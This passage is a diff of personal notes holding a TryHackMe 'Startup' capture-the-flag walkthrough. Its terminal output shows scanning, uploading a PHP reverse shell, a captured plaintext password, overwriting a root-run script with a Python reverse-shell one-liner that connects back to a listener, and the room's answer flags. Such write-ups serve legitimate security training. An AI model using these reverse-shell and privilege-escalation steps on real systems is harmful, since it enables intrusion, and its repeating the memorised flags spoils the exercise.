@@ -117,8 +117,6 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 67.28 seconds
 zsh: segmentation fault  sudo nmap -sC -sV -T4 -A 10.10.6.231
 
-
-
 ┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
 └─$ ftp 10.10.6.231                                                                                   
 Connected to 10.10.6.231.
@@ -194,7 +192,6 @@ by Ben "epi" Risher 🤓                 ver: 2.7.0
 ──────────────────────────────────────────────────
 200      GET       20l      113w      808c http://10.10.6.231/
 301      GET        9l       28w      310c http://10.10.6.231/files => http://10.10.6.231/files/
-
 
 uploading revshell.php
 
@@ -280,7 +277,6 @@ confidential  Documents   Music            Public          stager2.bat      Vide
 suspicious.pcapng: pcapng capture file - version 1.0
 
 open with wireshark follow tcp  stream 7
-
 
 Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
  17:40:21 up 20 min,  1 user,  load average: 0.00, 0.03, 0.12
@@ -430,7 +426,6 @@ ssh
 
 lennie:c4ntg3t3n0ughsp1c3
 
-
 www-data@startup:/incidents$ su lennie
 su lennie
 Password: c4ntg3t3n0ughsp1c3
@@ -471,7 +466,6 @@ cat /etc/print.sh
 #!/bin/bash
 echo "Done!"
 
-
 lennie@startup:~/scripts$ cat > /etc/print.sh << EOF
 cat > /etc/print.sh << EOF
 > #!/bin/bash
@@ -480,7 +474,6 @@ cat > /etc/print.sh << EOF
 <37));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'         
 > EOF
 EOF
-
 
 ┌──(kali㉿kali)-[~]
 └─$ rlwrap nc -nlvp 1337                    
@@ -494,37 +487,18 @@ cat /root/root.txt
 THM{f963aaa6a430f210222158ae15c3d76d}
 root@startup:~# 
 
-
-
-
-
-
-
 ```
-
-![[Pasted image 20220924224724.png]]
-
-![[Pasted image 20220924224837.png]]
-
 
 What is the secret spicy soup recipe?
 FTP and HTTP. What could possibly go wrong?
 *love*
 
-
-
 What are the contents of user.txt?
  Something doesn't belong.
 *THM{03ce3d619b80ccbfb3b7fc81e46c0e79}*
 
-
-
-
 What are the contents of root.txt?
 Scripts...
 *THM{f963aaa6a430f210222158ae15c3d76d}*
-
-
-
 
 [[Tech_Supp0rt 1]]
